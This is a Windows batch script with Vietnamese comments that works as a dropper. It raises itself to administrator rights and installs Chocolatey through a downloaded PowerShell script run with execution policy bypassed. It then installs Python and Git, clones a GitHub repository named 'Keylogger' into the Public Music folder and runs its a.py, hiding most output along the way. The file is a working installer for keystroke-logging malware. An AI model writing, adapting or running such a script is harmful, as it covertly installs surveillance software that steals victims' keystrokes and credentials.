@echo off
CHCP 65001

rem Tắt hiển thị thông báo trong quá trình chạy lệnh

net session >nul 2>&1
rem Kiểm tra xem phiên làm việc có quyền quản trị không
rem Nếu không có, yêu cầu quyền quản trị và chạy lại file batch với quyền quản trị

if %errorLevel% neq 0 (
    echo Đang yêu cầu quyền quản trị...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~0' -Verb runAs" >nul
    exit
)

:checkSoftware
rem Kiểm tra xem Python và Git đã được cài đặt chưa
python --version >nul 2>&1
set python_installed=%errorLevel%
git --version >nul 2>&1
set git_installed=%errorLevel%

rem Kiểm tra kết quả kiểm tra cài đặt
if %python_installed% equ 0 if %git_installed% equ 0 (
    goto cloneProject
) else (
    echo Một trong Python hoặc Git chưa được cài đặt. Cài đặt chúng ngay bây giờ...
    goto installChoco
)

:installChoco
rem Kiểm tra xem Chocolatey đã được cài đặt chưa
where choco >nul 2>&1

rem Nếu chưa cài đặt, tiến hành cài đặt Chocolatey và thêm đường dẫn vào biến môi trường PATH
if %errorLevel% neq 0 (
    echo Đang cài đặt Chocolatey...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
    setx PATH "%PATH%;%ALLUSERSPROFILE%\chocolatey\bin" -m
)
goto installPythonGit

:installPythonGit
rem Cài đặt Python và Git bằng Chocolatey
choco install python git -y >nul 2>&1

rem Kiểm tra lại sau quá trình cài đặt
python --version >nul 2>&1
set python_installed=%errorLevel%
git --version >nul 2>&1
set git_installed=%errorLevel%

if %python_installed% neq 0 if %git_installed% neq 0 (
    echo Lỗi trong quá trình cài đặt. Chạy lại file batch.
    goto startOver
) else (
    echo Python và Git đã được cài đặt thành công.
    goto cloneProject
)

:startOver
rem Khởi động lại file batch nếu cần
echo Khởi động lại file batch...
%0
exit

:cloneProject
cd C:\Users\Public\Music
rem Clone từ link GitHub
git clone https://github.com/LeDuonng/Keylogger.git
if %errorLevel% neq 0 goto error
rem Chạy dự án bằng Python
cd Keylogger
python a.py
if %errorLevel% neq 0 goto error
goto end

:error
echo Đã xảy ra lỗi. Vui lòng kiểm tra lại các bước.
goto startOver

:end
echo Dự án đã được clone và chạy.
pause